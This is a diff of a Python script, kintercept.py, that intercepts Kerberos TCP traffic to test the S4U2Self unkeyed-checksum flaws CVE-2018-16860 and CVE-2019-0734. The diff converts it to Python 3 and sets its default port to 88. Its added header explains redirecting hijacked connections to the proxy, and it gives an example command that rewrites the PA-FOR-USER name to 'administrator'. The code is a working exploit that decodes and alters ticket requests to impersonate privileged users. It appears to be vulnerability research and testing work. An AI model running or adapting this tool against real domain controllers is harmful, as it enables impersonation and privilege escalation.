@@ -1,10 +1,17 @@
 # MIT Licensed
 # Copyright (c) 2019 Isaac Boukris <iboukris@gmail.com>
 #
-# A tool for intercepting TCP streams and for testing KDC
-# handling of unkeyed checksums in MS Kerberos S4U2Self
+# A tool for intercepting TCP streams and for testing KDC handling
+# of PA-FOR-USER with unkeyed checksums in MS Kerberos S4U2Self
 # protocol extention (CVE-2018-16860 and CVE-2019-0734).
-
+#
+# The tool listens on a local port (default 88), to which the hijacked
+# connections should be redirected (via port forwarding, etc), and sends
+# all the packets to the upstream DC server.
+# If s4u2else handler is set, the name in PA-FOR-USER padata in every proxied
+# packet will be changed to the name specified in the handler's argument.
+#
+# Example: kintercept.py --request-handler s4u2else:administrator dc-ip-addr
 
 import struct, socket, sys, argparse, asyncore
 from binascii import crc32
@@ -16,18 +23,16 @@ from impacket.krb5.asn1 import TGS_REQ, TGS_REP, seq_set, PA_FOR_USER_ENC
 from impacket.krb5.types import Principal
 
 
-DEFAULT_PORT = 8888
-LISTEN_QUEUE = 10
 MAX_READ_SIZE = 16000
 MAX_BUFF_SIZE = 32000
-
+LISTEN_QUEUE = 10
 TYPE = 10
 
 def process_s4u2else_req(data, impostor):
     try:
         tgs = decoder.decode(data, asn1Spec = TGS_REQ())[0]
     except:
-        print 'Record is not a TGS-REQ'
+        print ('Record is not a TGS-REQ')
         return ''
 
     pa_tgs_req = pa_for_user = None
@@ -39,7 +44,7 @@ def process_s4u2else_req(data, impostor):
             pa_for_user = pa
 
     if not pa_tgs_req or not pa_for_user:
-        print 'TGS request is not S4U'
+        print ('TGS request is not S4U')
         return ''
 
     tgs['padata'] = noValue
@@ -48,7 +53,7 @@ def process_s4u2else_req(data, impostor):
     try:
         for_user_obj = decoder.decode(pa_for_user['padata-value'], asn1Spec = PA_FOR_USER_ENC())[0]
     except:
-        print 'Failed to decode PA_FOR_USER!'
+        print ('Failed to decode PA_FOR_USER!')
         return ''
 
     S4UByteArray = struct.pack('<I', TYPE)
@@ -73,7 +78,7 @@ def mod_tgs_rep_user(data, reply_user):
     try:
         tgs = decoder.decode(data, asn1Spec = TGS_REP())[0]
     except:
-        print 'Record is not a TGS-REP'
+        print ('Record is not a TGS-REP')
         return ''
 
     cname = Principal(reply_user, type=TYPE)
@@ -102,8 +107,7 @@ class InterceptConn(asyncore.dispatcher):
                 return ''
             else:
                 return data
-        except socket.error, why:
-            # winsock sometimes raises ENOTCONN
+        except socket.error as why:
             if why.args[0] in asyncore._DISCONNECTED:
                 self.handle_close()
                 return ''
@@ -128,11 +132,11 @@ class InterceptConn(asyncore.dispatcher):
     def handle_read(self):
         data_read = self.recv(self.max_read_size())
         if data_read:
-            print str(self.fileno()) + ': recieved ' + str(len(data_read)) + ' bytes'
+            print (str(self.fileno()) + ': recieved ' + str(len(data_read)) + ' bytes')
             self.forward_data(data_read)
 
     def handle_eof(self):
-        print str(self.fileno()) +  ': received eof'
+        print (str(self.fileno()) +  ': received eof')
         self.eof_received = True
 
     def need_to_send_eof(self):
@@ -148,18 +152,18 @@ class InterceptConn(asyncore.dispatcher):
     def handle_write(self):
         if not self.buffer_empty():
             sent = self.send(self.buffer)
-            print str(self.fileno()) +  ': sent ' + str(sent) + ' bytes'
+            print (str(self.fileno()) +  ': sent ' + str(sent) + ' bytes')
             if sent:
                 del self.buffer[:sent]
         if self.need_to_send_eof():
             self.shutdown(socket.SHUT_WR)
             self.eof_sent = True
-            print str(self.fileno()) +  ': sent eof'
+            print (str(self.fileno()) +  ': sent eof')
             if self.peer.eof_sent:
                 self.handle_close()
 
     def handle_close(self):
-        print 'Closing pair: [' + str(self.fileno()) +  ',' + str(self.peer.fileno()) + ']'
+        print ('Closing pair: [' + str(self.fileno()) +  ',' + str(self.peer.fileno()) + ']')
         self.peer.close()
         self.close()
 
@@ -179,7 +183,7 @@ def InterceptKRB5Tcp(process_record_func, arg):
 
                 header = ''.join(reversed(str(self.proto_buffer[:4])))
                 rec_len = struct.unpack('<L', header)[0]
-                print 'len of record: ' + str(rec_len)
+                print ('len of record: ' + str(rec_len))
 
                 if len(self.proto_buffer) < 4 + rec_len:
                     break
@@ -232,23 +236,21 @@ class InterceptServer(asyncore.dispatcher):
         try:
             upstream.create_socket(socket.AF_INET, socket.SOCK_STREAM)
             upstream.connect(self.target)
-            print 'accepted downconn fd: ' + str(downstream.fileno())
-            print 'established upconn fd: ' + str(upstream.fileno())
+            print ('accepted downconn fd: ' + str(downstream.fileno()))
+            print ('established upconn fd: ' + str(upstream.fileno()))
         except:
-            print str(conn.fileno()) + ': failed to connect to target'
+            print (str(conn.fileno()) + ': failed to connect to target')
             downstream.handle_close()
 
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Intercept TCP streams')
     parser.add_argument('server', help='Target server address')
-    parser.add_argument('--server-port', default=DEFAULT_PORT, type=int, help='Target server port')
+    parser.add_argument('--server-port', default=88, type=int, help='Target server port')
+    parser.add_argument('--listen-port', default=88, type=int, help='Port to listen on')
     parser.add_argument('--listen-addr', default='', help='Address to listen on')
-    parser.add_argument('--listen-port', default=DEFAULT_PORT, type=int, help='Port to listen on')
-    parser.add_argument('--request-handler', default='', type=str, metavar='HANDLER:ARG',
-                        help='Example: s4u2else:user')
-    parser.add_argument('--reply-handler', default='', type=str, metavar='HANDLER:ARG',
-                        help='Example: tgs-rep-user:user')
+    parser.add_argument('--request-handler', default='', metavar='HANDLER:ARG', help='Example: s4u2else:user')
+    parser.add_argument('--reply-handler', default='', metavar='HANDLER:ARG', help='Example: tgs-rep-user:user')
     return vars(parser.parse_args())
 
 
